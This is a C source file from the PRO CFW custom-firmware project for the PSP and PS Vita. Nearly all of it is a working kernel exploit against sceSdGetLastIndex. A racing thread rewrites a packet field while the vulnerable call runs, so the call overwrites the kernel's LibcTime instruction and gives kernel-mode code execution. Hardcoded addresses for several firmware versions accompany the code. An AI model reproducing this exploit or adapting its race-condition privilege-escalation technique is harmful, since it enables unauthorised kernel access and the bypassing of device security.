/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <psputility_savedata.h>
#include <module2.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include "kxploit.h"

/*
 sceSdGetLastIndex Kernel Exploit for PSP up to 6.60 and PS Vita up to 3.20, both PSP and PSX exploits
*/

// Vita 3.20
//#define LIBC_TIME_ADDR 0x8800F71C

// PSP 6.60
//#define LIBC_TIME_ADDR 0x8800F798

// PSP 5.03
#define LIBC_TIME_ADDR 0x0000F030

UserFunctions* g_tbl;

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;

int savedata_open = 0;

u32 packet[256], is_exploited, libctime_addr=LIBC_TIME_ADDR;

void executeKernel(u32 kernelContentFunction)
{
    _sceKernelLibcTime(0x08800000, kernelContentFunction|0x80000000);
}

void repairInstruction(KernelFunctions* k_tbl){
    _sw(0x8C654384, libctime_addr); // recover the damage we've done
}

void KernelFunction()
{
    is_exploited = 1;
}

int stubScanner(UserFunctions* tbl){

    g_tbl = tbl;

    // thread and interrupt functions
    PRTSTR("Scanning interrupt stubs");
    _sceKernelCpuSuspendIntr = g_tbl->KernelCpuSuspendIntr;
    _sceKernelCpuResumeIntr = g_tbl->KernelCpuResumeIntr;

    // vulnerable function
    PRTSTR("Scanning vulnerable function");
    _sceSdGetLastIndex = (void*)g_tbl->FindImportUserRam("sceChnnlsv", 0xC4C494F8);
    if (_sceSdGetLastIndex == NULL){
        PRTSTR("Opening savedata utility");
        g_tbl->p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
        _sceSdGetLastIndex = (void*)g_tbl->FindImportVolatileRam("sceChnnlsv", 0xC4C494F8);
        savedata_open = 1;
    }
    // the function we need to patch
    _sceKernelLibcTime = (void*)(g_tbl->KernelLibcTime);

    g_tbl->KernelDcacheWritebackAll();

    return (
        _sceKernelCpuSuspendIntr == NULL ||
        _sceKernelCpuResumeIntr == NULL ||
        _sceSdGetLastIndex == NULL ||
        _sceKernelLibcTime == NULL
    );
}

// the threads that will make sceSdGetLastIndex vulnerable
int qwik_thread()
{
    while (is_exploited != 1) {
        packet[9] = libctime_addr - 18 - (u32)&packet;
        g_tbl->KernelDelayThread(0);
    }

    return 0;
}

int doExploit()
{

    PRTSTR("Attempting kernel exploit");

    is_exploited = 0;

    // we create the thread and constantly attempt the exploit
    SceUID qwikthread = g_tbl->KernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);
    g_tbl->KernelStartThread(qwikthread, 0, NULL);

    while (is_exploited != 1) {
        packet[9] = (u32)16;
        _sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
        g_tbl->KernelDelayThread(0);
        _sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
        g_tbl->KernelDcacheWritebackAll();
    }

    if (savedata_open)
        g_tbl->p5_close_savedata();

    PRTSTR("kxploit done");

    return 0;
}
